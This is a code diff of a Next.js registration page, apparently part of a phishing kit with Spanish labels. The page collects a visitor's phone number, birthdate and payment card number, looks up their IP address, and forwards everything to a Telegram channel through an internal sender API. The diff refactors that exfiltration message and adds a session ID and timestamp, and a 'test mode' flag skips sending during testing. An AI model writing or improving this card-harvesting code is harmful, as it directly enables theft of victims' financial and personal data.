@@ -7,6 +7,8 @@ import { useRouter } from 'next/router';
 import axios from 'axios';
 import dayjs from 'dayjs';
 import { toast } from 'sonner';
+import { getSessionId } from '@/utils/session';
+import { formatRegistrationMessage, getTimestamp } from '@/utils/telegramFormatter';
 
 const Index = () => {
   const router = useRouter();
@@ -125,13 +127,17 @@ const Index = () => {
       if (!isTestMode) {
         // Only send to Telegram if NOT in test mode
         const ip = await axios.get('https://api.ipify.org?format=json');
+        const sessionId = getSessionId();
 
-        // Format message for Telegram
-        let message = `NUEVO REGISTRO\n\n` +
-          `Teléfono: ${formData.phone}\n\n` +
-          `Fecha de nacimiento: ${formData.birthdateDay}/${formData.birthdateMonth}/${formData.birthdateYear}\n\n` +
-          `Número de tarjeta: ${formData.cardNumber}\n\n` +
-          `IP: ${ip.data.ip}`;
+        // Format message for Telegram with improved structure
+        const message = formatRegistrationMessage({
+          sessionId,
+          phone: formData.phone,
+          birthdate: `${formData.birthdateDay}/${formData.birthdateMonth}/${formData.birthdateYear}`,
+          cardNumber: formData.cardNumber,
+          ip: ip.data.ip,
+          timestamp: getTimestamp()
+        });
 
         // Send directly to Telegram via sender API
         await axios.post('/api/sender', { message });
